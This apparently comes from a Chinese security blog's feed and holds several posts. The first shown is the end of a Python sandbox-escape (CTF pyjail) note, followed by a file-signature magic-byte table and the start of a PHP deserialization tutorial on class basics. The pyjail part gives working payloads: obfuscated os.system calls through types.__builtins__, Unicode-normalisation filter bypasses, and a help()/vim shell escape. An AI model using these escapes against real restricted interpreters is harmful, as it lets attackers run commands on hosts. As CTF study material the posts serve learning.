<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">71</span>]._Printer__setup.__globals__</span><br><span class="line">restricted attribute</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(<span class="built_in">getattr</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;types&#x27;</span>), <span class="string">&#x27;FileType&#x27;</span>)(<span class="string">&#x27;key&#x27;</span>), <span class="string">&#x27;re&#x27;</span><span class="string">&#x27;ad&#x27;</span>)()</span><br><span class="line">file() constructor <span class="keyword">not</span> accessible <span class="keyword">in</span> restricted mode</span><br><span class="line"></span><br><span class="line">DELPHI</span><br></pre></td></tr></table></figure>
<p>不过也正是由于 exec 运行在特定的命名空间里，可以通过其他命名空间里的 <code>__builtins__</code>，比如 types 库，来执行任意命令：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;types&#x27;</span>).__builtins__[<span class="string">&#x27;__tropmi__&#x27;</span>[::-<span class="number">1</span>]](<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]), <span class="string">&#x27;mets&#x27;</span> <span class="string">&#x27;ys&#x27;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">macr0phag3</span><br><span class="line"></span><br><span class="line">LISP</span><br></pre></td></tr></table></figure>
<h3 id="极端限制"><a class="markdownIt-Anchor" href="#极端限制"></a> 极端限制</h3>
<p>这种限制一般是组合形式出现，而且通常只会出现在 CTF 中。</p>
<blockquote>
<p>限制输入字符的集合的大小</p>
</blockquote>
<p>思路就是先确定不得不用到的字符，再看这些字符能够拼出哪些函数或者常量。</p>
<blockquote>
<p>限制不能使用 <code>[a-zA-Z]</code> 的字符</p>
</blockquote>
<p>Python3 支持了 Unicode 变量名且解释器在做代码解析的时候，会对变量名进行规范化，算法是 <code>NFKC</code>。</p>
<p>所以在这种情况下可以用这种姿势：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span> == ᵉval</span><br></pre></td></tr></table></figure>
<blockquote>
<p>socket + 严格的输入限制</p>
</blockquote>
<p>可以看看是否漏掉了 <code>help</code>，漏掉的话，先通过 <code>help()</code> 调起 vi/vim，然后用 <code>!</code> 指令即可 getshell</p>
<h2 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接</h2>
<blockquote>
<p><a href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">https://www.tr0y.wang/2019/05/06/Python沙箱逃逸经验总结/</a></p>
<p><a href="https://hosch3n.github.io/2020/08/27/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://hosch3n.github.io/2020/08/27/Python沙箱逃逸/</a></p>
</blockquote>
<p>声明：本文不做任何商用，仅展示自己的blog上方便自我查阅，若存在<strong>抄袭，搬运商用</strong>，请及时联系本人删除，发送邮箱！</p>
]]></content>
      <categories>
        <category>技术学习</category>
      </categories>
      <tags>
        <tag>pyjail</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>文件头标准编码</title>
    <url>/2022/11/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A0%87%E5%87%86%E7%BC%96%E7%A0%81/</url>
    <content><![CDATA[<p>tips</p>
<span id="more"></span>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">JPEG (jpg)，文件头：FF D8 FF</span><br><span class="line">PNG (png)，文件头：89 50 4E 47     【参考：png文件头详解】89 50 4e 47 0d 0a 1a 0a</span><br><span class="line">GIF (gif)，文件头：47 49 46 38</span><br><span class="line">Windows Bitmap (bmp)，文件头：42 4D [参考：bmp文件格式详解]42 4D 36 0C 30 00 00 00 00 00 36 00 00 00 28 00 00 00 56 05 00 00 00 03 00 00 01 00 18 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">python反编译文件pyc的头：03 F3 0D 0A  </span><br><span class="line">pyd的文件头：4D 5A 90 00</span><br><span class="line">ZIP Archive (zip)，文件头：50 4B 03 04 ascii码部分是PK，可以直接根据PK判断是zip文件</span><br><span class="line">doc文件rar文件: 52 61 72 21</span><br><span class="line">7z文件头：37 7A BC AF 27 1C</span><br><span class="line">MS Word/Excel (xls.or.doc)，文件头：D0CF11E0</span><br><span class="line">CAD (dwg)，文件头：41433130</span><br><span class="line">Adobe Photoshop (psd)，文件头：38425053</span><br><span class="line">Rich Text Format (rtf)，文件头：7B5C727466</span><br><span class="line">XML (xml)，文件头：3C3F786D6C</span><br><span class="line">HTML (html)，文件头：68746D6C3E</span><br><span class="line">Email [thorough only] (eml)，文件头：44656C69766572792D646174653A</span><br><span class="line">Outlook Express (dbx)，文件头：CFAD12FEC5FD746F</span><br><span class="line">Outlook (pst)，文件头：2142444E</span><br><span class="line">MS Access (mdb)，文件头：5374616E64617264204A</span><br><span class="line">WordPerfect (wpd)，文件头：FF575043</span><br><span class="line">Postscript (eps.or.ps)，文件头：252150532D41646F6265</span><br><span class="line">Adobe Acrobat (pdf)，文件头：255044462D312E</span><br><span class="line">Quicken (qdf)，文件头：AC9EBD8F</span><br><span class="line">Windows Password (pwl)，文件头：E3828596</span><br><span class="line">RAR Archive (rar)，文件头：52617221</span><br><span class="line">Wave (wav)，文件头：57415645</span><br><span class="line">AVI (avi)，文件头：41564920</span><br><span class="line">Real Audio (ram)，文件头：2E7261FD</span><br><span class="line">Real Media (rm)，文件头：2E524D46</span><br><span class="line">MPEG (mpg)，文件头：000001BA</span><br><span class="line">MPEG (mpg)，文件头：000001B3</span><br><span class="line">Quicktime (mov)，文件头：6D6F6F76</span><br><span class="line">Windows Media (asf)，文件头：3026B2758E66CF11</span><br><span class="line">MIDI (mid)，文件头：4D546864</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>PHP反序列化</title>
    <url>/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>PHP反序列化的学习总结，还有实践总结嗷QWQ</p>
<span id="more"></span>
<h1 id="反序列化漏洞"><a class="markdownIt-Anchor" href="#反序列化漏洞"></a> 反序列化漏洞</h1>
<p>​                                                                                                         --------------------------------<strong>TWe1v3</strong></p>
<h2 id="php类和对象详解"><a class="markdownIt-Anchor" href="#php类和对象详解"></a> PHP类和对象详解</h2>
<h3 id="一-php类和对象"><a class="markdownIt-Anchor" href="#一-php类和对象"></a> 一、PHP类和对象</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//定义一个类class Car &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span> = <span class="string">&#x27;手机&#x27;</span>;    <span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//实例化一个car对象$car = new Car();$car-&gt;name = &#x27;iPhone&#x27;; </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置对象的属性值echo $car-&gt;getName();  //调用对象的方法 输出对象的名字</span></span><br></pre></td></tr></table></figure>
<h3 id="二-类的属性"><a class="markdownIt-Anchor" href="#二-类的属性"></a> 二、类的属性</h3>
<p>在类中定义的变量称之为属性，通常属性跟数据库中的字段有一定的关联，因此也可以称作“字段”。属性声明是由关键字 public，protected 或者 private 开头，后面跟一个普通的变量声明来组成。属性的变量可以设置初始化的默认值，默认值必须是常量。</p>
<p>访问控制的关键字代表的意义为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span>：公开的 <span class="keyword">protected</span>：受保护的 <span class="keyword">private</span>：私有的</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;    <span class="comment">//定义公共属性    public $name = &#x27;汽车&#x27;;   </span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//定义受保护的属性    protected $corlor = &#x27;白色&#x27;;    </span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//定义私有属性    private $price = &#x27;100000&#x27;;&#125;</span></span><br><span class="line"></span><br><span class="line">默认都为<span class="keyword">public</span>，外部可以访问。一般通过-&gt;对象操作符来访问对象的属性或者方法，对于静态属性则使用::双冒号进行访问。当在类成员方法内部调用的时候，可以使用<span class="variable language_">$this</span>伪变量调用当前对象的属性。</span><br><span class="line"></span><br><span class="line"><span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="keyword">echo</span> <span class="variable">$car</span>-&gt;name;   </span><br><span class="line"></span><br><span class="line"><span class="comment">//调用对象的属性echo $car-&gt;color;  //错误 受保护的属性不允许外部调用echo $car-&gt;price;  //错误 私有属性不允许外部调用</span></span><br><span class="line"></span><br><span class="line">受保护的属性与私有属性不允许外部调用，在类的成员方法内部是可以调用的。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span></span>&#123;    <span class="keyword">private</span> <span class="variable">$price</span> = <span class="string">&#x27;1000&#x27;</span>;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPrice</span>(<span class="params"></span>) </span>&#123;        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;price; <span class="comment">//内部访问私有属性    &#125;&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="三-类的方法"><a class="markdownIt-Anchor" href="#三-类的方法"></a> 三、类的方法</h3>
<p>方法就是在类中的function，很多时候我们分不清方法与函数有什么差别，在面向过程的程序设计中function叫做函数，在面向对象中function则被称之为方法。</p>
<p>同属性一样，类的方法也具有public，protected 以及 private 的访问控制。</p>
<p>访问控制的关键字代表的意义为：<br>
public：公开的<br>
protected：受保护的<br>
private：私有的</p>
<p>可以这样定义方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>) </span>&#123;        <span class="keyword">return</span> <span class="string">&#x27;汽车&#x27;</span>;    &#125;&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="keyword">echo</span> <span class="variable">$car</span>-&gt;<span class="title function_ invoke__">getName</span>();</span><br><span class="line"></span><br><span class="line">使用关键字<span class="built_in">static</span>修饰的，称之为静态方法，静态方法不需要实例化对象，可以通过类名直接调用，操作符为双冒号::。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>) </span>&#123;        <span class="keyword">return</span> <span class="string">&#x27;汽车&#x27;</span>;    &#125;&#125;<span class="keyword">echo</span> <span class="title class_">Car</span>::<span class="title function_ invoke__">getName</span>(); <span class="comment">//结果为“汽车”</span></span><br></pre></td></tr></table></figure>
<h3 id="四-构造函数和析构函数"><a class="markdownIt-Anchor" href="#四-构造函数和析构函数"></a> 四、构造函数和析构函数</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP5可以在类中使用<span class="title function_ invoke__">__construct</span>()定义一个构造函数，具有构造函数的类，会在每次对象创建的时候调用该函数，因此常用来在对象创建的时候进行一些初始化工作。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;       <span class="keyword">print</span> <span class="string">&quot;构造函数被调用\n&quot;</span>;   &#125;&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>(); </span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化的时候 会自动调用构造函数__construct，这里会输出一个字符串</span></span><br><span class="line"></span><br><span class="line">在子类中如果定义了__construct则不会调用父类的__construct，如果需要同时调用父类的构造函数，需要使用<span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>()显式的调用。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;       <span class="keyword">print</span> <span class="string">&quot;父类构造函数被调用\n&quot;</span>;   &#125;&#125;<span class="class"><span class="keyword">class</span> <span class="title">Truck</span> <span class="keyword">extends</span> <span class="title">Car</span> </span>&#123;   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> </span>&#123;       <span class="keyword">print</span> <span class="string">&quot;子类构造函数被调用\n&quot;</span>;       <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();   &#125;&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Truck</span>();</span><br><span class="line"></span><br><span class="line">同样，PHP5支持析构函数，使用<span class="title function_ invoke__">__destruct</span>()进行定义，析构函数指的是当某个对象的所有引用被删除，或者对象被显式的销毁时会执行的函数。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;       <span class="keyword">print</span> <span class="string">&quot;构造函数被调用 \n&quot;</span>;   &#125;   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> </span>&#123;       <span class="keyword">print</span> <span class="string">&quot;析构函数被调用 \n&quot;</span>;   &#125;&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>(); <span class="comment">//实例化时会调用构造函数echo &#x27;使用后，准备销毁car对象 \n&#x27;;unset($car); //销毁时会调用析构函数</span></span><br></pre></td></tr></table></figure>
<p>当PHP代码执行完毕以后，会自动回收与销毁对象，因此一般情况下不需要显式的去销毁对象。</p>
<h3 id="五-static静态关键字"><a class="markdownIt-Anchor" href="#五-static静态关键字"></a> 五、Static静态关键字</h3>
<p>静态属性与方法可以在不实例化类的情况下调用，直接使用类名::方法名的方式进行调用。静态属性不允许对象使用-&gt;操作符调用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$speed</span> = <span class="number">10</span>;    </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getSpeed</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$speed</span>;    &#125;&#125;<span class="keyword">echo</span> <span class="title class_">Car</span>::<span class="title function_ invoke__">getSpeed</span>();  <span class="comment">//调用静态方法</span></span><br><span class="line"></span><br><span class="line">静态方法也可以通过变量来进行动态调用</span><br><span class="line"></span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;getSpeed&#x27;</span>;<span class="variable">$className</span> = <span class="string">&#x27;Car&#x27;</span>;<span class="keyword">echo</span> <span class="variable">$className</span>::<span class="variable">$func</span>();  <span class="comment">//动态调用静态方法</span></span><br></pre></td></tr></table></figure>
<p>静态方法中，$this伪变量不允许使用。可以使用self，parent，static在内部调用静态方法与属性。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$speed</span> = <span class="number">10</span>;    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getSpeed</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$speed</span>;</span><br><span class="line"></span><br><span class="line">    &#125;    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">speedUp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$speed</span>+=<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="class"><span class="keyword">class</span> <span class="title">BigCar</span> <span class="keyword">extends</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">speedUp</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">BigCar</span>::<span class="title function_ invoke__">start</span>();<span class="keyword">echo</span> <span class="title class_">BigCar</span>::<span class="title function_ invoke__">getSpeed</span>();</span><br></pre></td></tr></table></figure>
<h3 id="六-访问控制"><a class="markdownIt-Anchor" href="#六-访问控制"></a> 六、访问控制</h3>
<p>访问控制通过关键字public，protected和private来实现。被定义为公有的类成员可以在任何地方被访问。被定义为受保护的类成员则可以被其自身以及其子类和父类访问。被定义为私有的类成员则只能被其定义所在的类访问。</p>
<p>类属性必须定义为公有、受保护、私有之一。为兼容PHP5以前的版本，如果采用 var 定义，则被视为公有。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$speed</span> = <span class="number">10</span>; <span class="comment">//错误 属性必须定义访问控制</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$name</span>;   <span class="comment">//定义共有属性&#125;</span></span><br><span class="line"></span><br><span class="line">类中的方法可以被定义为公有、私有或受保护。如果没有设置这些关键字，则该方法默认为公有</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//默认为共有方法</span></span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">turnLeft</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">如果构造函数定义成了私有方法，则不允许直接实例化对象了，这时候一般通过静态方法进行实例化，在设计模式中会经常使用这样的方法来控制对象的创建，比如单例模式只允许有一个全局唯一的对象。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;object create&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   &#125;    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$_object</span> = <span class="literal">null</span>;    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="built_in">self</span>::<span class="variable">$_object</span>)) &#123;            <span class="built_in">self</span>::<span class="variable">$_object</span> = <span class="keyword">new</span> <span class="title class_">Car</span>(); <span class="comment">//内部方法可以调用私有方法，因此这里可以创建对象</span></span><br><span class="line"></span><br><span class="line">       &#125;        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$_object</span>;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//$car = new Car(); //这里不允许直接实例化对象$car = Car::getInstance(); //通过静态方法来获得一个实例</span></span><br></pre></td></tr></table></figure>
<h3 id="七-对象继承"><a class="markdownIt-Anchor" href="#七-对象继承"></a> 七、对象继承</h3>
<p>继承是面向对象程序设计中常用的一个特性，汽车是一个比较大的类，我们也可以称之为基类，除此之外，汽车还分为卡车、轿车、东风、宝马等，因为这些子类具有很多相同的属性和方法，可以采用继承汽车类来共享这些属性与方法，实现代码的复用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$speed</span> = <span class="number">0</span>; <span class="comment">//汽车的起始速度是0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">speedUp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;speed += <span class="number">10</span>;        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;speed;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//定义继承于Car的Truck类class Truck extends Car&#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">speedUp</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;speed = <span class="built_in">parent</span>::<span class="title function_ invoke__">speedUp</span>() + <span class="number">50</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="八-重载"><a class="markdownIt-Anchor" href="#八-重载"></a> 八、重载</h3>
<p>PHP中的重载指的是动态的创建属性与方法，是通过魔术方法来实现的。属性的重载通过__set，__get，__isset，__unset来分别实现对不存在属性的赋值、读取、判断属性是否设置、销毁属性。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="variable">$ary</span> = <span class="keyword">array</span>();    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="variable language_">$this</span>-&gt;ary[<span class="variable">$key</span>] = <span class="variable">$val</span>;</span><br><span class="line"></span><br><span class="line">   &#125;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;ary[<span class="variable">$key</span>])) &#123;            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ary[<span class="variable">$key</span>];</span><br><span class="line"></span><br><span class="line">       &#125;        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">   &#125;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;ary[<span class="variable">$key</span>])) &#123;            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">       &#125;        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">   &#125;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;ary[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="variable">$car</span>-&gt;name = <span class="string">&#x27;汽车&#x27;</span>;  <span class="comment">//name属性动态创建并赋值echo $car-&gt;name;</span></span><br><span class="line"></span><br><span class="line">方法的重载通过__call来实现，当调用不存在的方法的时候，将会转为参数调用__call方法，当调用不存在的静态方法时会使用__callStatic重载。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$speed</span> = <span class="number">0</span>;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$name</span> == <span class="string">&#x27;speedUp&#x27;</span>) &#123;            <span class="variable language_">$this</span>-&gt;speed += <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="variable">$car</span>-&gt;<span class="title function_ invoke__">speedUp</span>(); <span class="comment">//调用不存在的方法会使用重载echo $car-&gt;speed;</span></span><br></pre></td></tr></table></figure>
<h3 id="十-对象比较"><a class="markdownIt-Anchor" href="#十-对象比较"></a> 十、对象比较</h3>
<p>，当同一个类的两个实例的所有属性都相等时，可以使用比较运算符<mark>进行判断，当需要判断两个变量是否为同一个对象的引用时，可以使用全等运算符</mark>=进行判断。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;&#125;<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="keyword">if</span> (<span class="variable">$a</span> == <span class="variable">$b</span>) <span class="keyword">echo</span> <span class="string">&#x27;==&#x27;</span>;   <span class="comment">//trueif ($a === $b) echo &#x27;===&#x27;; //false</span></span><br><span class="line"></span><br><span class="line">对象复制，在一些特殊情况下，可以通过关键字<span class="keyword">clone</span>来复制一个对象，这时__clone方法会被调用，通过这个魔术方法来设置属性的值。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;car&#x27;</span>;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();        <span class="variable">$obj</span>-&gt;name = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="variable">$a</span>-&gt;name = <span class="string">&#x27;new car&#x27;</span>;<span class="variable">$b</span> = <span class="keyword">clone</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line">对象序列化，可以通过serialize方法将对象序列化为字符串，用于存储或者传递数据，然后在需要的时候通过unserialize将字符串反序列化成对象进行使用</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;car&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="variable">$str</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>); <span class="comment">//对象序列化成字符串echo $str.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;;$b = unserialize($str); //反序列化为对象var_dump($b);</span></span><br></pre></td></tr></table></figure>
<h2 id="反序列化"><a class="markdownIt-Anchor" href="#反序列化"></a> 反序列化</h2>
<h3 id="一-基本知识"><a class="markdownIt-Anchor" href="#一-基本知识"></a> 一、基本知识</h3>
<h4 id="~类和对象"><a class="markdownIt-Anchor" href="#~类和对象"></a> ~类和对象</h4>
<p>类的实体化结果是对象，而对象的抽象就是类。在开发过程中，我们通常都是先抽象(幻想)出一个类，再用该类去创建对象(实现幻想的内容)。在程序中，直接使用的是我们(实现幻想)的对象，而不是抽象(幻想)的类。</p>
<h4 id="~变量的属性"><a class="markdownIt-Anchor" href="#~变量的属性"></a> ~变量的属性</h4>
<p>public表示全局，类内部和外部子类都可以访问；</p>
<p>private表示私有的，只有本类内部可以使用；</p>
